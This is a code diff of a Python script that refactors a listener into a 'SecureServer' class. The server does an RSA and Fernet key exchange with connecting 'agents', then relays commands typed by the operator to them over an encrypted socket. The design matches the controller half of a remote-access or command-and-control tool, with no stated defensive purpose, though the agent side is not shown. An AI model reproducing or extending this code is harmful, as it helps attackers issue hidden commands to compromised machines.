@@ -2,32 +2,51 @@
 import socket
 import rsa
 from cryptography.fernet import Fernet
+MSGLEN=2048
 
-def create_socket(ip, port):
-  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  s.setblocking(False)
-  s.settimeout(0.5)
-  s.bind((ip, port))
-  s.listen()
-  print("[*] Listening on 62832...")
-  return s
+class SecureServer:
 
-if __name__ == "__main__":
-  public_key, private_key=rsa.newkeys(2048)
-  s = create_socket("127.0.0.1", 62832)
-  running=True
-  try:
+  def __init__(self, host="127.0.0.1", port=62832):
+    self.public_key, self.private_key = rsa.newkeys(2048)
+    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    self.sock.setblocking(False)
+    self.sock.settimeout(0.5)
+    self.sock.bind((host, port))
+    self.sock.listen()
+    print("[*] Listening on 62832...")
+
+  def handle_client(self):
+    print("[+] Agent received !")
+    cmd=input(" > ")
+    while cmd!="exit":
+      self.send(cmd)
+      cmd=input(" > ")
+    self.send("exit")
+
+  def run(self):
+    running=True
     while running:
       try:
-        client_socket, client_address = s.accept()
-        print(client_address)
-        client_socket.send(public_key.save_pkcs1())
-
-        print("[+] Agent recieved !")
-        encrypted_key=client_socket.recv(2048)
-        client_fernet=rsa.decrypt(encrypted_key, private_key)
-        print(client_fernet)
+        print("[*] Waiting...", end="\r")
+        self.client, client_address = self.sock.accept()
+        self.client.send(self.public_key.save_pkcs1())
+        self.key=Fernet(rsa.decrypt(self.client.recv(2048), self.private_key))
+        self.handle_client()
       except Exception as e:
         pass
+
+  def send(self, message):
+    msg=self.key.encrypt(str(message).encode('utf-8'))
+    self.client.send(msg)
+
+  def receive(self):
+    msg=self.client.recv(MSGLEN)
+    message=self.key.decrypt(msg).decode('utf-8')
+    return message
+
+if __name__ == "__main__":
+  server=SecureServer()
+  try:
+    server.run()
   except KeyboardInterrupt:
-    print("\nServer stopped.")
+    print("\r Server stopped.")
